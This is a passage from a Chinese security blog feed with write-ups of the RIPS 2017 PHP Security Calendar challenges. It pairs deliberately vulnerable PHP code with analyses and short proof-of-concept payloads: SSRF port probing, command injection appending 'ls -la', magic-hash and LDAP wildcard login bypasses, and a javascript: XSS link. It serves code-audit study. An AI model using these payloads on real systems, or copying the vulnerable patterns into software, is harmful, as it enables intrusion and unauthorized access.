title="漏洞验证"></a>漏洞验证</h3><p>正常情况下，如果使用<code>file_get_contents(&#39;http://127.0.0.1:80&#39;)</code>显示的仅仅只是<code>warning信息</code>，在正常的PHP页面中是不会显示warning信息的。但是在开启了上述的配置之后，所有的信息都会在页面上显示。这样就导致我们可以通过SSRF来探测内网的端口和服务了。例如：</p><ol><li>payload可以写为:<code>img=http://127.0.0.1:22</code>，如果出现了<code>There was an error: file_get_contents(http://127.0.0.1:22): failed to open stream: HTTP request failed! SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2</code>，则表示存在openssh的服务。</li><li>payload为<code>img=http://127.0.0.1:25</code>,如果出现了<code>There was an error: file_get_contents(http://127.0.0.1:25): failed to open stream: HTTP request failed! 220 ubuntu ESMTP Sendmail 8.15.2/8.15.2/Debian-3; Tue, 26 Dec 2017 07:43:45 -0800; (No UCE/UBE) logging access from: localhost</code>则表示存在SMTP。</li><li>如果通过payload访问不存在的端口,<code>img=http://127.0.0.1:30</code>，出现了<code>There was an error: file_get_contents(http://127.0.0.1:30): failed to open stream: Connection refused</code>，则表明30端口没有服务。</li></ol><p>所以通过这种方式就能够有效地探测内网端口服务了。</p><h2 id="Day-21-Gift-Wrap"><a href="#Day-21-Gift-Wrap" class="headerlink" title="Day 21 - Gift Wrap"></a>Day 21 - Gift Wrap</h2><h3 id="漏洞代码-10"><a href="#漏洞代码-10" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParamExtractor</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $validIndices = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">indices</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">    $validate = <span class="function"><span class="keyword">function</span> <span class="params">(int $value, $key)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> ($value &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;validIndices[] = $key;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      array_walk($input, $validate, <span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (TypeError $error) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Only numbers are allowed as input"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;validIndices;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCommand</span><span class="params">($parameters)</span> </span>&#123;</span><br><span class="line">    $indices = <span class="keyword">$this</span>-&gt;indices($parameters);</span><br><span class="line">    $params = [];</span><br><span class="line">    <span class="keyword">foreach</span> ($indices <span class="keyword">as</span> $index) &#123;</span><br><span class="line">      $params[] = $parameters[$index];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> implode($params, <span class="string">' '</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = (<span class="keyword">new</span> ParamExtractor())-&gt;getCommand($_GET[<span class="string">'p'</span>]);</span><br><span class="line">system(<span class="string">'resizeImg image.png '</span> . $cmd);</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-10"><a href="#漏洞分析-10" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这是一道在运行在php7上的题目，题目本上的考察点比较少见，主要是利用了<code>array_walk()</code>的一个bug。php是一个弱类型的语言，在传入参数时并不会进行类型检查，甚至有时候还会进行隐式类型转换，很多时候由于开发人员的疏忽就会导致漏洞产生。在php7中就引入了<code>declare(strict_types=1);</code>这种声明方式，在进行函数调用的时候会进行参数类型检查。如果参数类型不匹配则函数不会被调用，这种方式就和诸如Java这类强类型的语言就是一样的了。如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addnum</span><span class="params">(int $a,int $b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line">$result = addnum(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">var_dump($result);              <span class="comment">// 输出3</span></span><br><span class="line">$result = addnum(<span class="string">'1'</span>,<span class="string">'2'</span>);</span><br><span class="line">var_dump($result);              <span class="comment">//出现Fatal error: Uncaught TypeError，Argument 1 passed to addnum() must be of the type integer, string given,程序出错，参数的数据类型不匹配</span></span><br></pre></td></tr></table></figure><p>按照php7的这种类型，那么最后通过<code>validate()</code>函数的就只有参数是大于0的，这样看来本题目是没有问题的。但是本题的关键是在于使用了<code>array_walk()</code>来调用<code>validate</code>函数。<strong>通过<code>array_walk()</code>调用的函数会忽略掉严格模式还是按照之前的php的类型转换的方式调用函数。</strong>。如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addnum</span><span class="params">(int &amp;$value)</span> </span>&#123;</span><br><span class="line">    $value = $value+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">$input = <span class="keyword">array</span>(<span class="string">'3a'</span>,<span class="string">'4b'</span>);</span><br><span class="line">array_walk($input,addnum);</span><br><span class="line">var_dump($input);</span><br></pre></td></tr></table></figure><p>最后得到的input数组是<code>array(4,5)</code>,所以说明了在使用<code>array_walk()</code>会忽略掉类型检查。</p><h3 id="漏洞验证-10"><a href="#漏洞验证-10" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>那么在本题目中，由于<code>array_walk()</code>的这种特性，导致我们可以传入任意字符进去，从而也可以造成命令执行了。最后的payload可以是<code>?p[1]=1&amp;p[2]=2;%20ls%20-la</code>。</p><h2 id="Day-22-Chimney"><a href="#Day-22-Chimney" class="headerlink" title="Day 22 - Chimney"></a>Day 22 - Chimney</h2><h3 id="漏洞代码-11"><a href="#漏洞代码-11" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">  setcookie(<span class="string">'hash'</span>, md5($_POST[<span class="string">'password'</span>]));</span><br><span class="line">  header(<span class="string">"Refresh: 0"</span>);</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$password = <span class="string">'0e836584205638841937695747769655'</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'hash'</span>])) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;form&gt;&lt;input type="password" name="password" /&gt;'</span></span><br><span class="line">  . <span class="string">'&lt;input type="submit" value="Login" &gt;&lt;/form &gt;'</span>;</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (md5($_COOKIE[<span class="string">'hash'</span>]) == $password) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Login succeeded'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Login failed'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-11"><a href="#漏洞分析-11" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>存在若比较，并且以0e开头的md5值，只需要找到其他0e开头的hash即可验证通过。</p><h3 id="漏洞验证-11"><a href="#漏洞验证-11" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash=s878926199a</span><br></pre></td></tr></table></figure><h2 id="Day-23-Cookies"><a href="#Day-23-Cookies" class="headerlink" title="Day 23 - Cookies"></a>Day 23 - Cookies</h2><h3 id="漏洞代码-12"><a href="#漏洞代码-12" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LDAPAuthenticator</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $conn;</span><br><span class="line">  <span class="keyword">public</span> $host;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($host = <span class="string">"localhost"</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;host = $host;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">authenticate</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    $result = [];</span><br><span class="line">    <span class="keyword">$this</span>-&gt;conn = ldap_connect(<span class="keyword">$this</span>-&gt;host);</span><br><span class="line">    ldap_set_option(</span><br><span class="line">      <span class="keyword">$this</span>-&gt;conn,</span><br><span class="line">      LDAP_OPT_PROTOCOL_VERSION,</span><br><span class="line">      <span class="number">3</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (!@ldap_bind(<span class="keyword">$this</span>-&gt;conn))</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    $user = ldap_escape($user, <span class="keyword">null</span>, LDAP_ESCAPE_DN);</span><br><span class="line">    $pass = ldap_escape($pass, <span class="keyword">null</span>, LDAP_ESCAPE_DN);</span><br><span class="line">    $result = ldap_search(</span><br><span class="line">      <span class="keyword">$this</span>-&gt;conn,</span><br><span class="line">      <span class="string">""</span>,</span><br><span class="line">      <span class="string">"(&amp;(uid=$user)(userPassword=$pass))"</span></span><br><span class="line">    );</span><br><span class="line">    $result = ldap_get_entries(<span class="keyword">$this</span>-&gt;conn, $result);</span><br><span class="line">    <span class="keyword">return</span> ($result[<span class="string">"count"</span>] &gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"u"</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">"p"</span>])) &#123;</span><br><span class="line">  $ldap = <span class="keyword">new</span> LDAPAuthenticator();</span><br><span class="line">  <span class="keyword">if</span> ($ldap-&gt;authenticate($_GET[<span class="string">"u"</span>], $_GET[<span class="string">"p"</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You are now logged in!"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Username or password unknown!"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-12"><a href="#漏洞分析-12" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>本题主要是ldap的登录验证的代码，但是由于过滤函数使用不当而导致的任意用户登录的漏洞。</p><p>在题目中使用的过滤函数是<code>ldap_escape($user, null, LDAP_ESCAPE_DN)</code>。php手册上对第三个参数的说明如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ldap_escape ( string $value [, string $ignore = &quot;&quot; [, int $flags = 0 ]] ) : string</span><br><span class="line">Escapes value for use in the context implied by flags.</span><br><span class="line">参数 ¶</span><br><span class="line">value</span><br><span class="line">The value to escape.</span><br><span class="line"></span><br><span class="line">ignore</span><br><span class="line">Characters to ignore when escaping.</span><br><span class="line"></span><br><span class="line">flags</span><br><span class="line">The context the escaped string will be used in: LDAP_ESCAPE_FILTER for filters to be used with ldap_search(), or LDAP_ESCAPE_DN for DNs. If neither flag is passed, all chars are escaped.</span><br></pre></td></tr></table></figure><p>当使用<code>ldap_search()</code>时需要选择<code>LDAP_ESCAPE_FILTER</code>过滤字符串，但是本题中选择的是<code>LDAP_ESCAPE_DN</code>，这样就导致过滤无效。</p><h3 id="漏洞验证-12"><a href="#漏洞验证-12" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u=*&amp;p=123456</span><br></pre></td></tr></table></figure><h2 id="Day-24-Nutcracker"><a href="#Day-24-Nutcracker" class="headerlink" title="Day 24 - Nutcracker"></a>Day 24 - Nutcracker</h2><h3 id="漏洞代码-13"><a href="#漏洞代码-13" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@$GLOBALS=$GLOBALS&#123;next&#125;=next($GLOBALS&#123;<span class="string">'GLOBALS'</span>&#125;)</span><br><span class="line">  [$GLOBALS[<span class="string">'next'</span>][<span class="string">'next'</span>]=next($GLOBALS)[<span class="string">'GLOBALS'</span>]]</span><br><span class="line">  [$next[<span class="string">'GLOBALS'</span>]=next($GLOBALS[GLOBALS][<span class="string">'GLOBALS'</span>])</span><br><span class="line">  [$next[<span class="string">'next'</span>]]][$next[<span class="string">'GLOBALS'</span>]=next($next[<span class="string">'GLOBALS'</span>])]</span><br><span class="line">  [$GLOBALS[next][<span class="string">'next'</span>]($GLOBALS[<span class="string">'next'</span>]&#123;<span class="string">'GLOBALS'</span>&#125;)]=</span><br><span class="line">next(neXt($&#123;<span class="string">'next'</span>&#125;[<span class="string">'next'</span>]));</span><br></pre></td></tr></table></figure><p>这道题目是<code>Hack.lu CTF 2014: Next Global Backdoor</code>上的一道题目，具体的解答可以看<a href="https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/next-global-backdoor" target="_blank" rel="noopener">Hack.lu CTF 2014: Next Global Backdoor</a>，也有一篇中文文章的介绍<a href="http://drops.xmd5.com/static/drops/tips-3420.html" target="_blank" rel="noopener">Hack.lu 2014 Writeup</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;RIPS Technologies2017代码审计的第二篇。&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="https://www.sys71m.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="https://www.sys71m.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计(一)</title>
    <link href="https://www.sys71m.top/2020/02/13/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%80)/"/>
    <id>https://www.sys71m.top/2020/02/13/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%80)/</id>
    <published>2020-02-13T07:52:55.000Z</published>
    <updated>2020-11-04T23:46:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>学校延期开学，在家闲着没事，打算重新复习下php代码审计方面的知识，找到了RIPS Technologies2017年的一个代码审计项目，之前只是大致读过没有仔细分析，这次记录一下分析过程，第一篇。</p><a id="more"></a>  <h2 id="PHP-SECURITY-CALENDAR-2017"><a href="#PHP-SECURITY-CALENDAR-2017" class="headerlink" title="PHP SECURITY CALENDAR 2017"></a>PHP SECURITY CALENDAR 2017</h2><h3 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://www.ripstech.com/php-security-calendar-2017/</span></span><br></pre></td></tr></table></figure><h3 id="在线演示平台"><a href="#在线演示平台" class="headerlink" title="在线演示平台"></a>在线演示平台</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://github.com/vulnspy/ripstech-php-security-calendar-2017</span></span><br></pre></td></tr></table></figure><h3 id="php手册"><a href="#php手册" class="headerlink" title="php手册"></a>php手册</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://www.php.net/manual/zh/</span></span><br></pre></td></tr></table></figure><h2 id="Day-1-Wish-List"><a href="#Day-1-Wish-List" class="headerlink" title="Day 1 - Wish List"></a>Day 1 - Wish List</h2><h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> UPLOAD_DIRECTORY = <span class="string">'./solutions/'</span>;</span><br><span class="line">  <span class="keyword">private</span> $file;</span><br><span class="line">  <span class="keyword">private</span> $whitelist;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>], <span class="keyword">$this</span>-&gt;whitelist)) &#123;</span><br><span class="line">      move_uploaded_file(</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file[<span class="string">'tmp_name'</span>],</span><br><span class="line">        <span class="keyword">self</span>::UPLOAD_DIRECTORY . <span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>]</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = <span class="keyword">new</span> Challenge($_FILES[<span class="string">'solution'</span>]);</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码逻辑为上传一个文件，在类的初始化时创建一个1-24的白名单数组，文件赋值给<code>$file</code>，在类销毁时判断上传的文件名是否在白名单内，验证通过的话则将文件移动到指定目录<code>./solutions/</code>下。</p><p>在手册上查看<code>in_array</code>说明，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool</span><br><span class="line">大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。</span><br></pre></td></tr></table></figure><p>因此利用php的弱类型达到绕过白名单的目的，如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump("2.php"==2);</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>本地环境：kali+php7.3+apache2</p><p>坑点：代码中<code>UPLOAD_DIRECTORY</code>使用了相对路径，不知为何文件移动一直失败，改为绝对路径即可。</p><p>验证过程：使用postman抓取请求，改为post提交并添加文件。</p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/php2017/image-20200211191331162.png" alt="image-20200211191331162"></p><h2 id="Day-2-Twig"><a href="#Day-2-Twig" class="headerlink" title="Day 2 - Twig"></a>Day 2 - Twig</h2><h3 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// composer require "twig/twig"</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $twig;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $indexTemplate = <span class="string">'&lt;img '</span> .</span><br><span class="line">      <span class="string">'src="https://loremflickr.com/320/240"&gt;'</span> .</span><br><span class="line">      <span class="string">'&lt;a href="&#123;&#123;link|escape&#125;&#125;"&gt;Next slide &amp;raquo;&lt;/a&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default twig setup, simulate loading</span></span><br><span class="line">    <span class="comment">// index.html file from disk</span></span><br><span class="line">    $loader = <span class="keyword">new</span> Twig\Loader\ArrayLoader([</span><br><span class="line">      <span class="string">'index.html'</span> =&gt; $indexTemplate</span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;twig = <span class="keyword">new</span> Twig\Environment($loader);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNexSlideUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $nextSlide = $_GET[<span class="string">'nextSlide'</span>];</span><br><span class="line">    <span class="keyword">return</span> filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;twig-&gt;render(</span><br><span class="line">      <span class="string">'index.html'</span>,</span><br><span class="line">      [<span class="string">'link'</span> =&gt; <span class="keyword">$this</span>-&gt;getNexSlideUrl()]</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> Template())-&gt;render();</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码大致逻辑为通过<code>GET</code>请求获取<code>nextSlide</code>参数值，经过<code>filter_var</code>函数来判断是否为正确url，通过的话则通过<code>twig</code>的模板引擎渲染到页面中。但<code>filter_var</code>的过滤十分脆弱，只是在url格式上判断是否正确，没有进行协议方面的检测。因此，可以构造如下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript://comment%250aalert(1)</span><br></pre></td></tr></table></figure><p><code>Twig</code>中的<code></code>中的<code>escape</code>和PHP中的<code>htmlspecialchars($link, ENT_QUOTES, &#39;UTF-8&#39;)</code>类似，所以单引号和双引号等都无法使用。因为<code>%250a</code>即<code>%0a</code>表示换行符，在浏览器中<code>javascript://comment%250aalert(1)</code>会被解释为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript://comment</span><br><span class="line">alert(1)</span><br></pre></td></tr></table></figure><p><code>//</code>在 Javascript 中表示注释符，因此<code>comment</code>会被忽略，执行<code>alert(1)</code></p><h3 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>本地环境：phpEnv+composer</p><p>验证过程：</p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/php2017/image-20200212144742784.png" alt="image-20200212144742784"></p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/php2017/image-20200212143615129.png" alt="image-20200212143615129"></p><h2 id="Day-3-Snow-Flake"><a href="#Day-3-Snow-Flake" class="headerlink" title="Day 3 - Snow Flake"></a>Day 3 - Snow Flake</h2><h3 id="漏洞代码-2"><a href="#漏洞代码-2" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($className)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">include</span> $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[<span class="string">'c'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'d'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">    $controller = <span class="keyword">new</span> $controllerName($data);</span><br><span class="line">    $controller-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'There is no page with this name'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 